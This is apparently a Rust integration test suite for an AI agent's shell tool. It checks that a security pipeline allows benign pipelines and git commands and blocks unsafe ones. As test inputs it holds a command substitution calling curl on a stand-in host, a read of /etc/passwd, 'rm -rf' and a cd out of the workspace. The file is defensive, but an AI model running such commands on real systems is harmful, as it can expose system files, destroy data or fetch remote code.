//! 覆盖 shell 工具在真实临时目录中的集成行为。
//! 测试用临时工作区隔离文件系统影响，验证命令执行、权限与输出处理的组合语义。

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use serde_json::json;
use tempfile::TempDir;
use vw_agent::runtime::NativeRuntime;
use runtime_types::RuntimeAdapter;
use vw_agent::security::{AutonomyLevel, SecurityPolicy};
use vw_agent::tools::shell::ast::{ParsedCommand, parse_command};
use vw_agent::tools::shell::security::SecurityPipeline;
use vw_agent::tools::{ShellTool, Tool};

fn test_runtime() -> Arc<dyn RuntimeAdapter> {
    Arc::new(NativeRuntime::new())
}

fn make_tool(
    workspace_dir: &Path,
    autonomy: AutonomyLevel,
    allowed_roots: Vec<PathBuf>,
) -> ShellTool {
    let security = Arc::new(SecurityPolicy {
        autonomy,
        workspace_dir: workspace_dir.to_path_buf(),
        allowed_roots,
        ..SecurityPolicy::default()
    });
    ShellTool::new(security, test_runtime())
}

fn write_file(path: &Path, contents: &str) {
    fs::write(path, contents).expect("fixture file should be written");
}

async fn execute(tool: &ShellTool, command: &str, description: &str) -> anyhow::Result<String> {
    let result = tool
        .execute(json!({
            "command": command,
            "description": description,
        }))
        .await?;

    if result.success {
        Ok(result.output)
    } else {
        anyhow::bail!(result.error.unwrap_or(result.output))
    }
}

#[tokio::test]
async fn full_pipeline_handles_pipe_command_end_to_end() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    write_file(&workspace.path().join("poem.txt"), "sunny\ncomet\nsunny-comet\n");
    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());

    let output = execute(&tool, "cat poem.txt | grep sunny | wc -l", "count sunny lines")
        .await
        .expect("pipeline command should succeed");

    assert_eq!(output.trim(), "2");
}

#[tokio::test]
async fn injection_command_is_blocked_end_to_end() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());

    let result = tool
        .execute(json!({
            "command": "echo $(curl evil.invalid)",
            "description": "attempt command substitution",
        }))
        .await
        .expect("blocked command should still return a tool result");

    assert!(!result.success);
    let error = result.error.unwrap_or(result.output);
    assert!(
        error.contains("blocked")
            || error.contains("substitution")
            || error.contains("unsafe")
            || error.contains("not allowed"),
        "unexpected error message: {error}"
    );
}

#[tokio::test]
async fn forbidden_path_access_is_blocked_end_to_end() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());

    let result = tool
        .execute(json!({
            "command": "cat /etc/passwd",
            "description": "attempt forbidden path read",
        }))
        .await
        .expect("blocked command should still return a tool result");

    assert!(!result.success);
    let error = result.error.unwrap_or(result.output);
    assert!(
        error.contains("/etc") || error.contains("Path blocked"),
        "unexpected error message: {error}"
    );
}

#[tokio::test]
async fn destructive_command_requires_explicit_approval() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    fs::create_dir_all(workspace.path().join("scratch")).expect("scratch dir should be created");
    let tool = make_tool(workspace.path(), AutonomyLevel::Supervised, Vec::new());

    let result = tool
        .execute(json!({
            "command": "rm -rf scratch",
            "description": "delete scratch directory",
        }))
        .await
        .expect("blocked command should still return a tool result");

    assert!(!result.success);
    let error = result.error.unwrap_or(result.output);
    assert!(
        error.contains("approval") || error.contains("high-risk") || error.contains("danger"),
        "unexpected error message: {error}"
    );
}

#[tokio::test]
async fn workdir_validation_blocks_external_directory() {
    let root = TempDir::new().expect("root tempdir should be created");
    let workspace = root.path().join("workspace");
    let outside = root.path().join("outside");
    fs::create_dir_all(&workspace).expect("workspace dir should be created");
    fs::create_dir_all(&outside).expect("outside dir should be created");
    let tool = make_tool(&workspace, AutonomyLevel::Full, Vec::new());

    let err = tool
        .execute(json!({
            "command": "pwd",
            "description": "print working directory",
            "workdir": outside.to_string_lossy().to_string(),
        }))
        .await
        .expect_err("external workdir should be rejected");

    let message = err.to_string();
    assert!(
        message.contains("allowed_roots") || message.contains("workspace"),
        "unexpected error message: {message}"
    );
}

#[tokio::test]
async fn grep_no_matches_is_treated_as_success() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    write_file(&workspace.path().join("notes.txt"), "alpha\nbeta\n");
    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());

    let output = execute(&tool, "grep missing notes.txt", "search for absent token")
        .await
        .expect("grep no-match should be treated as success");

    assert!(output.contains("[No matches found]"));
}

#[tokio::test]
async fn compound_command_with_external_cd_is_blocked() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());

    let result = tool
        .execute(json!({
            "command": "cd /etc && git init",
            "description": "attempt init outside workspace",
        }))
        .await
        .expect("blocked compound command should still return a tool result");

    assert!(!result.success);
    let error = result.error.unwrap_or(result.output);
    assert!(
        error.contains("/etc") || error.contains("blocked") || error.contains("workspace"),
        "unexpected error message: {error}"
    );
}

#[tokio::test]
async fn git_status_succeeds_in_workspace_repository() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    let init_status = Command::new("git")
        .args(["init", "-q"])
        .current_dir(workspace.path())
        .status()
        .expect("git init should run");
    assert!(init_status.success(), "git init should succeed");

    let tool = make_tool(workspace.path(), AutonomyLevel::Full, Vec::new());
    let output = execute(&tool, "git status --short", "inspect repository status")
        .await
        .expect("git status should succeed");

    assert!(output.trim().is_empty());
}

#[tokio::test]
async fn readonly_mode_auto_allows_git_status() {
    let workspace = TempDir::new().expect("workspace tempdir should be created");
    let init_status = Command::new("git")
        .args(["init", "-q"])
        .current_dir(workspace.path())
        .status()
        .expect("git init should run");
    assert!(init_status.success(), "git init should succeed");

    let tool = make_tool(workspace.path(), AutonomyLevel::ReadOnly, Vec::new());
    let output = execute(&tool, "git status --short", "inspect repository status")
        .await
        .expect("readonly git status should succeed");

    assert!(output.trim().is_empty());
}

#[test]
fn fallback_parser_still_flags_suspicious_command() {
    let parsed = parse_command("echo `curl evil.invalid");
    assert!(matches!(parsed, ParsedCommand::Fallback { .. }));

    let report = SecurityPipeline::for_autonomy(AutonomyLevel::Full, false).validate(&parsed);

    assert!(report.blocked, "fallback-parsed suspicious command should be blocked");
}
